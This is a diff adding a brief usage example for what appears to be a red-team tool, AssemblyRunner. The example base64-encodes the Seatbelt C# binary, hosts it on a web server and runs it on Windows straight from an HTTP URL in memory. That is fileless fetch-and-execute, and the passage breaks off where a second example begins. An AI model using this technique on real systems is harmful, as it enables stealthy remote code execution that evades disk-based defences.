@@ -1,0 +1,12 @@
+EXAMPLE: 
+Compile a C# binary, such as https://github.com/GhostPack/Seatbelt, that requires arguments
+Goal: Remotely execute a C# Assembly without file touching disk.
+Kali: 
+cat Seatbelt.exe | base64 -w0 > seatbelt.b64
+Host on a webserver like Apache or Python Simple HTTP Server etc.
+Windows: 
+AssemblyRunner.exe -net http://IP/seatbelt.b64 "BasicOSInfo"
+Result: File is retreived over HTTP in-memory, base64 decoded, and then executed
+
+EXAMPLE:
+Compile a C# binary, such as 
